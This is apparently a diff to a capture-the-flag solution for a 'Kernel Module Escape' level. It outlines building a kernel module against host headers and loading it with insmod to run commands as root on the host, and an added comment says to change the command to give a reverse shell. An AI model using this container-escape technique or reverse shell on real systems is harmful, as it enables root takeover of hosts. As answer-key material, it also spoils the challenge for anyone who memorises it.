@@ -2,10 +2,10 @@ SOLUTION — Level 5: Kernel Module Escape
 
 # Build the module against the host kernel headers
 cd /root/module
+
+# Update the command to give you a reverse shell then compile
 make
 
-# Load the module — executes call_usermodehelper as root on the host
-insmod escape.ko
+# Load the module
+insmod module.ko
 
-# The module writes the flag to /tmp/flag
-cat /tmp/flag
